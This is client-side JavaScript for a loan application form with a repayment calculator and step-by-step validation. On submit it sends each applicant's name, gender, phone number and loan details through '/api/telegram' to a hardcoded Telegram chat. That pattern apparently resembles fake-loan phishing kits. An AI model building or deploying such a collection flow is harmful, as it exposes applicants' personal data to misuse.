// Telegram config is loaded from telegram-config.js
const TELEGRAM_CONFIG = window.TELEGRAM_CONFIG || {
  CHAT_ID: '8510653374'
};

// ── Cookie utilities ──────────────────────────────────────────────
function setCookie(name, value, days) {
  const expires = new Date();
  expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
  document.cookie = name + '=' + encodeURIComponent(value) + ';expires=' + expires.toUTCString() + ';path=/';
}

function getCookie(name) {
  const value = '; ' + document.cookie;
  const parts = value.split('; ' + name + '=');
  if (parts.length === 2) return decodeURIComponent(parts.pop().split(';').shift());
  return null;
}

// Save entire application state to a cookie so users don't lose progress
function saveToCookies() {
  setCookie('loan_app_state', JSON.stringify(state), 30);
}

// Load saved state from cookie and pre-fill all form fields
function loadFromCookies() {
  const saved = getCookie('loan_app_state');
  if (!saved) return;

  try {
    const data = JSON.parse(saved);
    // Merge saved data into state (keep defaults for missing fields)
    state = { ...state, ...data };

    // ── Pre-fill Step 1 sliders ──
    const slAmount = document.getElementById('slAmount');
    const slTerm = document.getElementById('slTerm');
    if (slAmount) { slAmount.value = state.amount; }
    if (slTerm) { slTerm.value = state.term; }
    updateCalc();

    // ── Pre-fill Step 2 fields ──
    if (state.loanType) {
      document.querySelectorAll('.loan-type-btn').forEach(function (btn) {
        btn.classList.toggle('selected', btn.textContent.trim().indexOf(state.loanType) === 0);
      });
    }
    const loanPurpose = document.getElementById('loanPurpose');
    if (loanPurpose && state.purpose) { loanPurpose.value = state.purpose; }

    // ── Pre-fill Step 3 fields ──
    if (state.firstName) { const el = document.getElementById('firstName'); if (el) el.value = state.firstName; }
    if (state.lastName) { const el = document.getElementById('lastName'); if (el) el.value = state.lastName; }
    if (state.gender) { const el = document.getElementById('gender'); if (el) el.value = state.gender; }
    if (state.phone) { const el = document.getElementById('phoneNum'); if (el) el.value = state.phone; }

  } catch (e) {
    // If cookie data is corrupt, ignore it
  }
}

// Application state
let state = {
  amount: 200,
  term: 12,
  loanType: '',
  purpose: '',
  firstName: '',
  lastName: '',
  gender: '',
  phone: ''
};

const ANNUAL_INTEREST_RATE = 5;
let isSubmittingApplication = false;

function updateSubmitStatus(type, message, allowRetry) {
  const statusEl = document.getElementById('submitStatus');
  const retryWrap = document.querySelector('.submit-actions');
  const retryBtn = document.getElementById('retrySubmitBtn');

  if (!statusEl || !retryWrap || !retryBtn) {
    return;
  }

  if (!message) {
    statusEl.textContent = '';
    statusEl.classList.remove('show', 'info', 'success', 'error');
    retryWrap.classList.remove('show');
    retryBtn.disabled = false;
    return;
  }

  statusEl.textContent = message;
  statusEl.classList.remove('info', 'success', 'error');
  statusEl.classList.add('show', type);

  retryWrap.classList.toggle('show', Boolean(allowRetry));
  retryBtn.disabled = isSubmittingApplication;
}

function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function fetchWithTimeout(url, options, timeoutMs) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

  try {
    return await fetch(url, {
      ...options,
      signal: controller.signal
    });
  } finally {
    clearTimeout(timeoutId);
  }
}

// Calculate monthly repayment using an annual nominal rate (converted to monthly)
function calcRepay(p, n, annualRatePct) {
  const monthlyRate = (annualRatePct / 100) / 12;
  if (monthlyRate === 0) {
    return p / n;
  }
  return p * monthlyRate * Math.pow(1 + monthlyRate, n) / (Math.pow(1 + monthlyRate, n) - 1);
}

// Update calculator display
function updateCalc() {
  const p = parseInt(document.getElementById('slAmount').value);
  const n = parseInt(document.getElementById('slTerm').value);

  // Update state
  state.amount = p;
  state.term = n;

  // Update display values
  document.getElementById('lblAmount').textContent = '$' + p.toLocaleString();
  document.getElementById('lblTerm').textContent = n + ' month' + (n > 1 ? 's' : '');

  // Calculate repayment
  const monthlyRepayment = calcRepay(p, n, ANNUAL_INTEREST_RATE);
  const totalRepayable = monthlyRepayment * n;

  // Update repayment display
  document.getElementById('lblRepay').textContent = '$' + monthlyRepayment.toFixed(2);
  document.getElementById('lblTotal').textContent = '$' + totalRepayable.toFixed(2);
}

// Initialize calculator
document.addEventListener('DOMContentLoaded', function() {
  // Set up calculator event listeners
  document.getElementById('slAmount').addEventListener('input', updateCalc);
  document.getElementById('slTerm').addEventListener('input', updateCalc);

  // Initial calculation
  updateCalc();

  // Load any previously saved data from cookies
  loadFromCookies();

  // Wire modal button action once (avoid duplicate listeners)
  const doneBtn = document.getElementById('modalDoneBtn');
  if (doneBtn) {
    doneBtn.addEventListener('click', () => {
      hideProcessingDialog();
      window.location.href = 'submitted.html';
    });
  }
});

// Select loan type
function selectType(btn, type) {
  // Remove selected class from all buttons
  document.querySelectorAll('.loan-type-btn').forEach(b => b.classList.remove('selected'));

  // Add selected class to clicked button
  btn.classList.add('selected');

  // Update state
  state.loanType = type;

  // Hide error message
  document.getElementById('err_type').style.display = 'none';
}

// Navigate to step
function goTo(n) {
  // Hide all steps
  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));

  // Show target step
  document.getElementById('step' + n).classList.add('active');

  // Update progress bar
  updateProgress(n);

  // Scroll to top
  window.scrollTo(0, 0);

  // Prefill values for step 2
  if (n === 2) {
    document.getElementById('pf_amount').textContent = '$' + state.amount.toLocaleString();
    document.getElementById('pf_term').textContent = state.term + ' months';
  }

  // Fill summary for step 4
  if (n === 4) {
    fillSummary();
  }
}

// Update progress bar
function updateProgress(n) {
  for (let i = 1; i <= 4; i++) {
    const circle = document.getElementById('pc' + i);

    // Reset classes
    if (circle) {
      circle.classList.remove('active', 'done');
    }

    if (i < n) {
      // Completed steps
      if (circle) {
        circle.classList.add('done');
        circle.textContent = '✓';
      }
    } else if (i === n) {
      // Current step
      if (circle) {
        circle.classList.add('active');
        circle.textContent = i;
      }
    } else {
      // Future steps
      if (circle) {
        circle.textContent = i;
      }
    }
  }

  // Update progress lines
  for (let i = 1; i <= 3; i++) {
    const line = document.getElementById('pline' + i);
    if (line) {
      line.classList.toggle('done', i < n);
    }
  }
}

// Validate step 2 (loan details)
function validateStep2() {
  let isValid = true;

  // Check loan type selection
  if (!state.loanType) {
    document.getElementById('err_type').style.display = 'block';
    isValid = false;
  }

  // Check loan purpose
  const purpose = document.getElementById('loanPurpose').value.trim();
  if (!purpose) {
    document.getElementById('err_purpose').style.display = 'block';
    isValid = false;
  } else {
    document.getElementById('err_purpose').style.display = 'none';
  }

  // If valid, update state and proceed
  if (isValid) {
    state.purpose = purpose;
    saveToCookies();
    goTo(3);
  }
}

// Validate step 3 (personal details + identity)
function validateStep3() {
  let isValid = true;

  const firstName = document.getElementById('firstName').value.trim();
  const lastName = document.getElementById('lastName').value.trim();
  const gender = document.getElementById('gender').value;
  const phone = document.getElementById('phoneNum').value.trim();

  // Validate first name
  if (!firstName) {
    document.getElementById('err_fn').style.display = 'block';
    isValid = false;
  } else {
    document.getElementById('err_fn').style.display = 'none';
  }

  // Validate last name
  if (!lastName) {
    document.getElementById('err_ln').style.display = 'block';
    isValid = false;
  } else {
    document.getElementById('err_ln').style.display = 'none';
  }

  // Validate gender
  if (!gender) {
    document.getElementById('err_gender').style.display = 'block';
    isValid = false;
  } else {
    document.getElementById('err_gender').style.display = 'none';
  }

  // Validate phone (Zimbabwe format)
  const isValidPhone = /^\+263\d{9}$/.test(phone);

  if (!isValidPhone) {
    document.getElementById('err_ph').style.display = 'block';
    isValid = false;
  } else {
    document.getElementById('err_ph').style.display = 'none';
  }

  // If valid, update state and proceed
  if (isValid) {
    state.firstName = firstName;
    state.lastName = lastName;
    state.gender = gender;
    state.phone = phone;
    saveToCookies();
    goTo(4);
  }
}

// Fill summary in step 4
function fillSummary() {
  const monthlyRepayment = calcRepay(state.amount, state.term, ANNUAL_INTEREST_RATE);
  const totalRepayable = monthlyRepayment * state.term;
  const totalInterest = totalRepayable - state.amount;

  document.getElementById('s_amount').textContent = '$' + state.amount.toLocaleString();
  document.getElementById('s_term').textContent = state.term + ' months';
  document.getElementById('s_repay').textContent = '$' + monthlyRepayment.toFixed(2) + '/mo';
  document.getElementById('s_total').textContent = '$' + totalRepayable.toFixed(2);
  document.getElementById('s_interest').textContent = '$' + totalInterest.toFixed(2);
  document.getElementById('s_type').textContent = state.loanType;
  document.getElementById('s_purpose').textContent = state.purpose;
  document.getElementById('s_name').textContent = state.firstName + ' ' + state.lastName;
  document.getElementById('s_gender').textContent = state.gender;
  document.getElementById('s_phone').textContent = state.phone;

  // Build repayment schedule
  buildRepaymentSchedule(state.amount, state.term, ANNUAL_INTEREST_RATE);
}

// Build repayment schedule table
function buildRepaymentSchedule(principal, months, annualRate) {
  const container = document.getElementById('repaymentSchedule');
  container.innerHTML = '';

  const monthlyRate = (annualRate / 100) / 12;
  const monthlyPayment = calcRepay(principal, months, annualRate);
  let balance = principal;

  for (let i = 1; i <= months; i++) {
    // Use amortization formula
    const intPay = balance * monthlyRate;
    const princPay = monthlyPayment - intPay;
    balance = balance - princPay;
    if (balance < 0.01) balance = 0;

    const row = document.createElement('div');
    row.className = 'schedule-row';
    if (i > 3) row.classList.add('schedule-hidden');
    row.innerHTML = `
      <span>${i}</span>
      <span>$${monthlyPayment.toFixed(2)}</span>
      <span>$${princPay.toFixed(2)}</span>
      <span>$${intPay.toFixed(2)}</span>
      <span>$${balance.toFixed(2)}</span>
    `;
    container.appendChild(row);
  }

  // Show/hide toggle
  const toggle = document.getElementById('scheduleToggle');
  if (months <= 3) {
    toggle.style.display = 'none';
  } else {
    toggle.style.display = 'block';
    toggle.textContent = 'Show all ' + months + ' months ▼';
  }
}

// Toggle repayment schedule visibility
let scheduleExpanded = false;
function toggleSchedule() {
  scheduleExpanded = !scheduleExpanded;
  const rows = document.querySelectorAll('.schedule-hidden');
  const toggle = document.getElementById('scheduleToggle');
  rows.forEach(r => r.style.display = scheduleExpanded ? 'flex' : 'none');
  toggle.textContent = scheduleExpanded ? 'Show less ▲' : 'Show all ' + state.term + ' months ▼';
}

// Submit application
async function submitApp() {
  if (isSubmittingApplication) {
    return;
  }

  updateSubmitStatus(null, '');

  // Validate T&C checkbox
  const agreed = document.getElementById('agreeTerms').checked;
  if (!agreed) {
    document.getElementById('err_terms').style.display = 'block';
    return;
  } else {
    document.getElementById('err_terms').style.display = 'none';
  }

  // Show loading state
  const submitBtn = document.querySelector('.btn-submit');
  const originalText = submitBtn.textContent;
  submitBtn.textContent = 'Submitting...';
  submitBtn.disabled = true;
  isSubmittingApplication = true;
  updateSubmitStatus('info', 'Submitting your application securely. Please wait...', false);

  try {
    // Send data to Telegram
    await sendToTelegram();

    // Store loan data in localStorage for later flows
    localStorage.setItem('applicationPhone', state.phone);
    const monthlyRepay = calcRepay(state.amount, state.term, ANNUAL_INTEREST_RATE);
    const loanData = {
      amount: state.amount,
      term: state.term,
      monthlyRepayment: monthlyRepay.toFixed(2),
      totalRepayable: (monthlyRepay * state.term).toFixed(2),
      loanType: state.loanType,
      purpose: state.purpose,
      firstName: state.firstName,
      lastName: state.lastName,
      gender: state.gender,
      phone: state.phone
    };
    localStorage.setItem('loanData', JSON.stringify(loanData));
    setCookie('loan_completed', 'true', 30);

    // Show temporary processing dialog
    showProcessingDialog();
    updateSubmitStatus('success', 'Application submitted successfully. Redirecting you now...', false);

    // Redirect to the single confirmation page after a brief pause
    setTimeout(() => {
      hideProcessingDialog();
      window.location.href = 'submitted.html';
    }, 2200);

    // Update progress line and circles
    updateProgress(4);

  } catch (error) {
    console.error('Failed to submit application:', error);
    updateSubmitStatus('error', 'Submission could not be completed right now. Check your network and tap Retry Submit.', true);
  } finally {
    // Reset button state
    submitBtn.textContent = originalText;
    submitBtn.disabled = false;
    isSubmittingApplication = false;
    const retryBtn = document.getElementById('retrySubmitBtn');
    if (retryBtn) {
      retryBtn.disabled = false;
    }
  }
}

// Send application data to Telegram bot via serverless function
async function sendToTelegram() {
  if (!TELEGRAM_CONFIG.CHAT_ID) {
    throw new Error('Telegram chat ID not configured');
  }

  const monthlyRepayment = calcRepay(state.amount, state.term, ANNUAL_INTEREST_RATE);
  const totalRepayable = monthlyRepayment * state.term;

  // Format message for Telegram
  const message = `
🆕 NEW LOAN APPLICATION

👤 Personal Details:
- Name: ${state.firstName} ${state.lastName}
- Gender: ${state.gender}
- Phone: ${state.phone}

💰 Loan Details:
- Amount: $${state.amount.toLocaleString()}
- Term: ${state.term} months
- Interest Rate: ${ANNUAL_INTEREST_RATE.toFixed(2)}% p.a.
- Monthly Repayment: $${monthlyRepayment.toFixed(2)}
- Total Repayable: $${totalRepayable.toFixed(2)}
- Loan Type: ${state.loanType}

📝 Purpose:
${state.purpose}

📅 Submitted on: ${new Date().toLocaleString()}
  `.trim();

  // Call serverless function instead of Telegram API directly
  const url = '/api/telegram';

  const maxAttempts = 3;
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      const response = await fetchWithTimeout(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          message: message,
          chatId: TELEGRAM_CONFIG.CHAT_ID
        })
      }, 15000);

      let responseData = null;
      try {
        responseData = await response.json();
      } catch (_error) {
        responseData = null;
      }

      if (!response.ok) {
        const status = response.status;
        const canRetry = status === 429 || status >= 500;

        if (canRetry && attempt < maxAttempts) {
          await wait(500 * attempt);
          continue;
        }

        throw new Error(`Failed to send message: ${(responseData && responseData.error) || response.statusText}`);
      }

      if (!responseData || !responseData.success) {
        if (attempt < maxAttempts) {
          await wait(500 * attempt);
          continue;
        }

        throw new Error(`Failed to send message: ${(responseData && responseData.error) || 'Unknown error'}`);
      }

      return;
    } catch (error) {
      const isTimeout = error && error.name === 'AbortError';
      const canRetry = isTimeout || (error instanceof TypeError);

      if (canRetry && attempt < maxAttempts) {
        await wait(500 * attempt);
        continue;
      }

      throw error;
    }
  }
}

function showProcessingDialog() {
  const modal = document.getElementById('processingModal');
  if (!modal) {
    window.location.href = 'submitted.html';
    return;
  }

  modal.classList.add('show'); // Add show class to display modal
}

function hideProcessingDialog() {
  const modal = document.getElementById('processingModal');
  if (modal) {
    modal.classList.remove('show');
  }
}
